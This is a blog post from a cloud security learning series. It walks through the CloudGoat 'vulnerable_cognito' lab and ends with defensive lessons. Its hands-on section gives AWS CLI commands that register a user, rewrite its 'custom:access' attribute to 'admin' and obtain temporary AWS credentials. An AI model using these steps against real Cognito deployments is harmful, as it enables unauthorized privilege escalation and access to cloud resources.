<!DOCTYPE html><!--T3D1rtAHkxDRBIUJfY_F3--><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/440a8f778eae53e9.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-ca8ebae7f954b22a.js"/><script src="/_next/static/chunks/4bd1b696-21f374d1156f834a.js" async=""></script><script src="/_next/static/chunks/255-87b65d3beb72be65.js" async=""></script><script src="/_next/static/chunks/main-app-105e7bfa05751db9.js" async=""></script><script src="/_next/static/chunks/909-740805674b8356ef.js" async=""></script><script src="/_next/static/chunks/619-ba102abea3e3d0e4.js" async=""></script><script src="/_next/static/chunks/451-c2def8cce98c3140.js" async=""></script><script src="/_next/static/chunks/app/layout-98c332aef2240fe1.js" async=""></script><script src="/_next/static/chunks/app/blog/%5Bslug%5D/page-586f9b997c6ba5d5.js" async=""></script><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""/><title>100 Days of Cloud Security - Day 11: Cloud Security Journey | Gitfolio Blogger</title><meta name="description" content="Day 11 of my cloud security journey - Cloud Security Journey"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="32x32"/><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&amp;family=Fira+Code:wght@400;700&amp;family=Orbitron:wght@400;700&amp;display=swap" rel="stylesheet"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="font-body antialiased min-h-screen bg-background text-foreground"><div hidden=""><!--$--><!--/$--></div><script>((a,b,c,d,e,f,g,h)=>{let i=document.documentElement,j=["light","dark"];function k(b){var c;(Array.isArray(a)?a:[a]).forEach(a=>{let c="class"===a,d=c&&f?e.map(a=>f[a]||a):e;c?(i.classList.remove(...d),i.classList.add(f&&f[b]?f[b]:b)):i.setAttribute(a,b)}),c=b,h&&j.includes(c)&&(i.style.colorScheme=c)}if(d)k(d);else try{let a=localStorage.getItem(b)||c,d=g&&"system"===a?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":a;k(d)}catch(a){}})("class","theme","system",null,["light","dark"],null,true,true)</script><div class="relative flex min-h-dvh flex-col"><header class="sticky top-0 z-50 w-full border-b border-border/40 bg-background/80 backdrop-blur-md supports-[backdrop-filter]:bg-background/60"><div class="w-full px-4 md:px-8 flex h-16 items-center justify-between"><a class="flex items-center gap-2" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-cloud-lightning h-6 w-6 text-primary"><path d="M6 16.326A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 .5 8.973"></path><path d="m13 12-3 5h4l-3 5"></path></svg><span class="font-cyber text-xl font-bold text-primary">x0vrpp</span></a><div class="flex items-center gap-6"><nav class="hidden md:flex items-center gap-6"><a class="transition-all relative text-lg md:text-sm px-2 py-1 rounded-md hover:text-primary hover:bg-primary/10 hover:shadow-[0_0_10px_rgba(var(--primary),0.5)] text-muted-foreground" href="/">About Me</a><a class="transition-all relative text-lg md:text-sm px-2 py-1 rounded-md hover:text-primary hover:bg-primary/10 hover:shadow-[0_0_10px_rgba(var(--primary),0.5)] text-muted-foreground" href="/certifications">Certifications</a><a class="transition-all relative text-lg md:text-sm px-2 py-1 rounded-md hover:text-primary hover:bg-primary/10 hover:shadow-[0_0_10px_rgba(var(--primary),0.5)] text-muted-foreground" href="/projects">Projects</a><a class="transition-all relative text-lg md:text-sm px-2 py-1 rounded-md hover:text-primary hover:bg-primary/10 hover:shadow-[0_0_10px_rgba(var(--primary),0.5)] text-primary font-bold shadow-[0_0_15px_rgba(var(--primary),0.6)]" href="/blog">Blog<span class="absolute -bottom-1 left-0 w-full h-[2px] bg-primary shadow-[0_0_10px_var(--primary)] hidden md:block animate-pulse"></span></a></nav><div class="hidden md:block"><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover:bg-accent hover:text-accent-foreground h-9 w-9 rounded-full"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sun h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-moon absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path></svg><span class="sr-only">Toggle theme</span></button></div><div class="flex items-center md:hidden gap-4"><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover:bg-accent hover:text-accent-foreground h-9 w-9 rounded-full"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sun h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-moon absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path></svg><span class="sr-only">Toggle theme</span></button><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover:bg-accent hover:text-accent-foreground h-10 w-10" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-_R_n5lb_" data-state="closed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu h-6 w-6"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg><span class="sr-only">Open Menu</span></button></div></div></div></header><main class="flex-1 container flex flex-col py-4 md:py-8"><article class="max-w-4xl mx-auto px-4 py-8"><header class="mb-8 text-center"><h1 class="font-headline text-3xl md:text-5xl font-bold text-primary mb-3">100 Days of Cloud Security - Day 11: Cloud Security Journey</h1><div class="text-muted-foreground text-sm md:text-base"><span>By <!-- -->Venkata Pathuri<!-- --> on </span><time dateTime="2025-11-20">November 20, 2025</time></div></header><div data-orientation="horizontal" role="none" class="shrink-0 bg-border h-[1px] w-full my-8"></div><div class="prose prose-lg dark:prose-invert max-w-none prose-headings:text-primary prose-a:text-primary"><h1>Day 11: Cloud Security Journey</h1>
<h2>Overview</h2>
<p>Welcome to Day 11 of our cloud security learning journey! Today, we dive into the world of AWS Cognito and explore how its vulnerabilities can be exploited. Building upon the foundational concepts from Day 10, where we examined the principles of identity and access management, we will engage in a hands-on attack scenario using CloudGoat. This experience not only broadens our understanding of cloud security risks but also equips us with the knowledge to better defend against such vulnerabilities in real-world applications.</p>
<h2>Learning Objectives</h2>
<p>By the end of todayâ€™s session, you will master the intricacies of AWS Cognito, understand the attack vectors associated with identity pools, and gain practical experience in exploiting misconfigurations. You will learn how to enumerate user attributes, escalate privileges, and pivot to AWS credentials. This knowledge is crucial as it helps you recognize vulnerabilities in user management systems and reinforces best practices for securing cloud environments.</p>
<h2>Deep Dive</h2>
<h3>Understanding AWS Cognito</h3>
<p>Amazon Cognito is a powerful service that facilitates user authentication and management for web and mobile applications. It comprises two key components: <strong>User Pools</strong> and <strong>Identity Pools</strong>. User Pools serve as directories where user information, such as email and passwords, is stored and managed, while Identity Pools provide temporary AWS credentials, allowing users to access AWS resources securely.</p>
<p>In todayâ€™s scenario, we focus on a vulnerable configuration within Cognitoâ€™s identity pool, enabling us to exploit the applicationâ€™s access control mechanisms.</p>
<h3>The Attack Scenario: <code>vulnerable_cognito</code></h3>
<p>Our attack scenario involves a standard penetration testing methodology:</p>
<ol>
<li><strong>Enumeration</strong>: Extracting vital information from the application's source code.</li>
<li><strong>Gaining Access</strong>: Leveraging the gathered information to gain unauthorized access to resources.</li>
</ol>
<p>The initial phase of enumeration revealed the User Pool ID, Client ID, and Identity Pool ID. By inspecting hidden pages and utilizing the AWS CLI, we managed to bypass the user sign-up verification process, allowing us to create an account quickly and confirm our identity.</p>
<h3>Privilege Escalation</h3>
<p>After logging in with our newly created account, we hypothesized that the application might allow us to modify our <code>custom:access</code> attribute. By executing the <code>update-user-attributes</code> command, we escalated our privileges to "admin." This step illustrates a common pitfall in application security, where user attributes are writable without proper validation, leading to potential access control vulnerabilities.</p>
<h3>Acquiring AWS Credentials</h3>
<p>Once we established ourselves as an admin user, we obtained an ID Token and used it to retrieve a federated Identity ID. This was crucial for exchanging the Identity ID for temporary AWS credentials, granting us broad access to AWS resources such as S3, Cognito, and Lambda.</p>
<h2>Hands-On Practice</h2>
<p>To replicate this scenario, follow these steps:</p>
<ol>
<li><strong>Deploy the CloudGoat scenario</strong>: Launch the <code>vulnerable_cognito</code> in your AWS environment.</li>
<li><strong>Perform enumeration</strong>:
<ul>
<li>Access the provided URL to view the login/signup page.</li>
<li>Inspect the HTML source to extract the User Pool ID, Client ID, and Identity Pool ID.</li>
</ul>
</li>
<li><strong>Sign up a user</strong>:
<pre><code class="language-bash">aws cognito-idp sign-up --client-id 693ps117isv4gk3d6sa7fh7ftb --username 'attacker@example.com' --password 'P@ssword123!' --user-attributes '[{"Name":"given_name","Value":"Attacker"},{"Name":"family_name","Value":"User"}]'
</code></pre>
</li>
<li><strong>Confirm the user</strong>:
<pre><code class="language-bash">aws cognito-idp admin-confirm-sign-up --user-pool-id us-east-1_vWfb2fStY --username 'attacker@example.com'
</code></pre>
</li>
<li><strong>Login and inspect your attributes</strong>:
<pre><code class="language-bash">aws cognito-idp get-user --access-token [REDACTED_ACCESS_TOKEN]
</code></pre>
</li>
<li><strong>Modify user attributes</strong>:
<pre><code class="language-bash">aws cognito-idp update-user-attributes --access-token [REDACTED_ACCESS_TOKEN] --user-attributes '[{"Name":"custom:access","Value":"admin"}]'
</code></pre>
</li>
<li><strong>Fetch AWS credentials</strong>:
<pre><code class="language-bash">aws cognito-identity get-credentials-for-identity --region us-east-1 --identity-id 'us-east-1:e8447a5e-6004-c883-8d36-5515f1aaa0ef' --logins 'cognito-idp.us-east-1.amazonaws.com/us-east-1_vWfb2fStY=[REDACTED_ID_TOKEN]'
</code></pre>
</li>
</ol>
<h3>Expected Outcomes</h3>
<p>If executed correctly, you will successfully escalate your privileges and receive temporary AWS credentials, allowing you access to various AWS services. To verify success, check the permissions of the IAM role associated with your new credentials.</p>
<h3>Common Troubleshooting Tips</h3>
<ul>
<li>Ensure that your AWS CLI is configured properly with the necessary permissions.</li>
<li>Double-check the syntax of your commands for any typos.</li>
<li>If you encounter issues, re-evaluate the attributes you're trying to modify and ensure they are indeed writable.</li>
</ul>
<h2>Key Takeaways</h2>
<p>Todayâ€™s exploration of the <code>vulnerable_cognito</code> scenario highlights the importance of understanding identity and access management within cloud environments. We learned how seemingly innocuous user attributes could be exploited to gain unauthorized access, reinforcing the need for robust validation mechanisms. This exercise serves as a reminder that cloud security is not just about protecting infrastructure but also ensuring that user management systems are resilient against manipulation.</p>
<h2>Real-World Applications</h2>
<p>In production environments, the findings from todayâ€™s exercise underscore the critical need for stringent access controls and proper attribute validation. Organizations must adopt a defense-in-depth approach by implementing multi-factor authentication, continuous monitoring, and regular audits of user attributes and permissions. By doing so, they can mitigate the risks associated with identity pool misconfigurations and maintain a secure cloud infrastructure.</p>
<hr>
<p><strong>Journey Progress:</strong> 11/100 Days Complete ðŸš€</p>
</div></article><!--$--><!--/$--></main><footer class="border-t"><div class="container flex flex-col items-center justify-center gap-4 py-8 md:h-24 md:flex-row"><div class="flex flex-col items-center gap-4 px-8 md:flex-row md:gap-2 md:px-0"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-cloud-lightning h-6 w-6 text-primary"><path d="M6 16.326A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 .5 8.973"></path><path d="m13 12-3 5h4l-3 5"></path></svg><p class="text-center text-sm leading-loose text-muted-foreground md:text-left">Â© <!-- -->2025<!-- --> Venkata Pathuri. All Rights Reserved.</p></div></div></footer></div><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><script src="/_next/static/chunks/webpack-ca8ebae7f954b22a.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[1458,[\"909\",\"static/chunks/909-740805674b8356ef.js\",\"619\",\"static/chunks/619-ba102abea3e3d0e4.js\",\"451\",\"static/chunks/451-c2def8cce98c3140.js\",\"177\",\"static/chunks/app/layout-98c332aef2240fe1.js\"],\"ThemeProvider\"]\n3:I[6970,[\"909\",\"static/chunks/909-740805674b8356ef.js\",\"619\",\"static/chunks/619-ba102abea3e3d0e4.js\",\"451\",\"static/chunks/451-c2def8cce98c3140.js\",\"177\",\"static/chunks/app/layout-98c332aef2240fe1.js\"],\"default\"]\n4:I[9766,[],\"\"]\n5:I[8924,[],\"\"]\n6:I[704,[\"909\",\"static/chunks/909-740805674b8356ef.js\",\"619\",\"static/chunks/619-ba102abea3e3d0e4.js\",\"451\",\"static/chunks/451-c2def8cce98c3140.js\",\"177\",\"static/chunks/app/layout-98c332aef2240fe1.js\"],\"Toaster\"]\n8:I[4431,[],\"OutletBoundary\"]\na:I[5278,[],\"AsyncMetadataOutlet\"]\nc:I[4431,[],\"ViewportBoundary\"]\ne:I[4431,[],\"MetadataBoundary\"]\nf:\"$Sreact.suspense\"\n11:I[7150,[],\"\"]\n:HL[\"/_next/static/css/440a8f778eae53e9.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"T3D1rtAHkxDRBIUJfY-F3\",\"p\":\"\",\"c\":[\"\",\"blog\",\"100-days-of-cloud-security-day-11\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"blog\",{\"children\":[[\"slug\",\"100-days-of-cloud-security-day-11\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/440a8f778eae53e9.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"suppressHydrationWarning\":true,\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"link\",null,{\"rel\":\"preconnect\",\"href\":\"https://fonts.googleapis.com\"}],[\"$\",\"link\",null,{\"rel\":\"preconnect\",\"href\":\"https://fonts.gstatic.com\",\"crossOrigin\":\"\"}],[\"$\",\"link\",null,{\"href\":\"https://fonts.googleapis.com/css2?family=Inter:wght@400;700\u0026family=Fira+Code:wght@400;700\u0026family=Orbitron:wght@400;700\u0026display=swap\",\"rel\":\"stylesheet\"}]]}],[\"$\",\"body\",null,{\"className\":\"font-body antialiased min-h-screen bg-background text-foreground\",\"children\":[\"$\",\"$L2\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"disableTransitionOnChange\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"relative flex min-h-dvh flex-col\",\"children\":[[\"$\",\"$L3\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex-1 container flex flex-col py-4 md:py-8\",\"children\":[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"footer\",null,{\"className\":\"border-t\",\"children\":[\"$\",\"div\",null,{\"className\":\"container flex flex-col items-center justify-center gap-4 py-8 md:h-24 md:flex-row\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex flex-col items-center gap-4 px-8 md:flex-row md:gap-2 md:px-0\",\"children\":[[\"$\",\"svg\",null,{\"ref\":\"$undefined\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":24,\"height\":24,\"viewBox\":\"0 0 24 24\",\"fill\":\"none\",\"stroke\":\"currentColor\",\"strokeWidth\":2,\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"className\":\"lucide lucide-cloud-lightning h-6 w-6 text-primary\",\"children\":[[\"$\",\"path\",\"1cez44\",{\"d\":\"M6 16.326A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 .5 8.973\"}],[\"$\",\"path\",\"1t22er\",{\"d\":\"m13 12-3 5h4l-3 5\"}],\"$undefined\"]}],[\"$\",\"p\",null,{\"className\":\"text-center text-sm leading-loose text-muted-foreground md:text-left\",\"children\":[\"Â© \",2025,\" Venkata Pathuri. All Rights Reserved.\"]}]]}]}]}]]}],[\"$\",\"$L6\",null,{}]]}]}]]}]]}],{\"children\":[\"blog\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"100-days-of-cloud-security-day-11\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L7\",null,[\"$\",\"$L8\",null,{\"children\":[\"$L9\",[\"$\",\"$La\",null,{\"promise\":\"$@b\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],null],[\"$\",\"$Le\",null,{\"children\":[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$f\",null,{\"fallback\":null,\"children\":\"$L10\"}]}]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$11\",[]],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"12:I[8474,[\"909\",\"static/chunks/909-740805674b8356ef.js\",\"953\",\"static/chunks/app/blog/%5Bslug%5D/page-586f9b997c6ba5d5.js\"],\"Separator\"]\n13:T19ce,"])</script><script>self.__next_f.push([1,"\u003ch1\u003eDay 11: Cloud Security Journey\u003c/h1\u003e\n\u003ch2\u003eOverview\u003c/h2\u003e\n\u003cp\u003eWelcome to Day 11 of our cloud security learning journey! Today, we dive into the world of AWS Cognito and explore how its vulnerabilities can be exploited. Building upon the foundational concepts from Day 10, where we examined the principles of identity and access management, we will engage in a hands-on attack scenario using CloudGoat. This experience not only broadens our understanding of cloud security risks but also equips us with the knowledge to better defend against such vulnerabilities in real-world applications.\u003c/p\u003e\n\u003ch2\u003eLearning Objectives\u003c/h2\u003e\n\u003cp\u003eBy the end of todayâ€™s session, you will master the intricacies of AWS Cognito, understand the attack vectors associated with identity pools, and gain practical experience in exploiting misconfigurations. You will learn how to enumerate user attributes, escalate privileges, and pivot to AWS credentials. This knowledge is crucial as it helps you recognize vulnerabilities in user management systems and reinforces best practices for securing cloud environments.\u003c/p\u003e\n\u003ch2\u003eDeep Dive\u003c/h2\u003e\n\u003ch3\u003eUnderstanding AWS Cognito\u003c/h3\u003e\n\u003cp\u003eAmazon Cognito is a powerful service that facilitates user authentication and management for web and mobile applications. It comprises two key components: \u003cstrong\u003eUser Pools\u003c/strong\u003e and \u003cstrong\u003eIdentity Pools\u003c/strong\u003e. User Pools serve as directories where user information, such as email and passwords, is stored and managed, while Identity Pools provide temporary AWS credentials, allowing users to access AWS resources securely.\u003c/p\u003e\n\u003cp\u003eIn todayâ€™s scenario, we focus on a vulnerable configuration within Cognitoâ€™s identity pool, enabling us to exploit the applicationâ€™s access control mechanisms.\u003c/p\u003e\n\u003ch3\u003eThe Attack Scenario: \u003ccode\u003evulnerable_cognito\u003c/code\u003e\u003c/h3\u003e\n\u003cp\u003eOur attack scenario involves a standard penetration testing methodology:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eEnumeration\u003c/strong\u003e: Extracting vital information from the application's source code.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGaining Access\u003c/strong\u003e: Leveraging the gathered information to gain unauthorized access to resources.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe initial phase of enumeration revealed the User Pool ID, Client ID, and Identity Pool ID. By inspecting hidden pages and utilizing the AWS CLI, we managed to bypass the user sign-up verification process, allowing us to create an account quickly and confirm our identity.\u003c/p\u003e\n\u003ch3\u003ePrivilege Escalation\u003c/h3\u003e\n\u003cp\u003eAfter logging in with our newly created account, we hypothesized that the application might allow us to modify our \u003ccode\u003ecustom:access\u003c/code\u003e attribute. By executing the \u003ccode\u003eupdate-user-attributes\u003c/code\u003e command, we escalated our privileges to \"admin.\" This step illustrates a common pitfall in application security, where user attributes are writable without proper validation, leading to potential access control vulnerabilities.\u003c/p\u003e\n\u003ch3\u003eAcquiring AWS Credentials\u003c/h3\u003e\n\u003cp\u003eOnce we established ourselves as an admin user, we obtained an ID Token and used it to retrieve a federated Identity ID. This was crucial for exchanging the Identity ID for temporary AWS credentials, granting us broad access to AWS resources such as S3, Cognito, and Lambda.\u003c/p\u003e\n\u003ch2\u003eHands-On Practice\u003c/h2\u003e\n\u003cp\u003eTo replicate this scenario, follow these steps:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eDeploy the CloudGoat scenario\u003c/strong\u003e: Launch the \u003ccode\u003evulnerable_cognito\u003c/code\u003e in your AWS environment.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePerform enumeration\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eAccess the provided URL to view the login/signup page.\u003c/li\u003e\n\u003cli\u003eInspect the HTML source to extract the User Pool ID, Client ID, and Identity Pool ID.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSign up a user\u003c/strong\u003e:\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws cognito-idp sign-up --client-id 693ps117isv4gk3d6sa7fh7ftb --username 'attacker@example.com' --password 'P@ssword123!' --user-attributes '[{\"Name\":\"given_name\",\"Value\":\"Attacker\"},{\"Name\":\"family_name\",\"Value\":\"User\"}]'\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eConfirm the user\u003c/strong\u003e:\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws cognito-idp admin-confirm-sign-up --user-pool-id us-east-1_vWfb2fStY --username 'attacker@example.com'\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLogin and inspect your attributes\u003c/strong\u003e:\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws cognito-idp get-user --access-token [REDACTED_ACCESS_TOKEN]\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eModify user attributes\u003c/strong\u003e:\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws cognito-idp update-user-attributes --access-token [REDACTED_ACCESS_TOKEN] --user-attributes '[{\"Name\":\"custom:access\",\"Value\":\"admin\"}]'\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFetch AWS credentials\u003c/strong\u003e:\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws cognito-identity get-credentials-for-identity --region us-east-1 --identity-id 'us-east-1:e8447a5e-6004-c883-8d36-5515f1aaa0ef' --logins 'cognito-idp.us-east-1.amazonaws.com/us-east-1_vWfb2fStY=[REDACTED_ID_TOKEN]'\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eExpected Outcomes\u003c/h3\u003e\n\u003cp\u003eIf executed correctly, you will successfully escalate your privileges and receive temporary AWS credentials, allowing you access to various AWS services. To verify success, check the permissions of the IAM role associated with your new credentials.\u003c/p\u003e\n\u003ch3\u003eCommon Troubleshooting Tips\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eEnsure that your AWS CLI is configured properly with the necessary permissions.\u003c/li\u003e\n\u003cli\u003eDouble-check the syntax of your commands for any typos.\u003c/li\u003e\n\u003cli\u003eIf you encounter issues, re-evaluate the attributes you're trying to modify and ensure they are indeed writable.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eKey Takeaways\u003c/h2\u003e\n\u003cp\u003eTodayâ€™s exploration of the \u003ccode\u003evulnerable_cognito\u003c/code\u003e scenario highlights the importance of understanding identity and access management within cloud environments. We learned how seemingly innocuous user attributes could be exploited to gain unauthorized access, reinforcing the need for robust validation mechanisms. This exercise serves as a reminder that cloud security is not just about protecting infrastructure but also ensuring that user management systems are resilient against manipulation.\u003c/p\u003e\n\u003ch2\u003eReal-World Applications\u003c/h2\u003e\n\u003cp\u003eIn production environments, the findings from todayâ€™s exercise underscore the critical need for stringent access controls and proper attribute validation. Organizations must adopt a defense-in-depth approach by implementing multi-factor authentication, continuous monitoring, and regular audits of user attributes and permissions. By doing so, they can mitigate the risks associated with identity pool misconfigurations and maintain a secure cloud infrastructure.\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003eJourney Progress:\u003c/strong\u003e 11/100 Days Complete 